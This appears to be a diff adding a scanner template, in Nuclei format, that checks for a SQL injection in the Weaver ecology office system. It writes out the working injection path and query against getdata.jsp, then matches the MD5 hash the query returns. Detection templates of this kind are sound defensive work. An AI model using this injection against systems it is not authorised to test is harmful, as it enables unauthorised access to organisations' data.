@@ -1,0 +1,22 @@
+id: ecology-sqli
+
+info:
+  name: POCID10714 泛微ecology协同商务办公系统SQL注入
+  author: Str1am
+  severity: medium
+  tags: ecology,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/js;/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))%20as%20id%20from%20HrmResourceManager"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0xe10adc3949ba59abbe56e057f20f883e"
+        part: body
+        condition: and
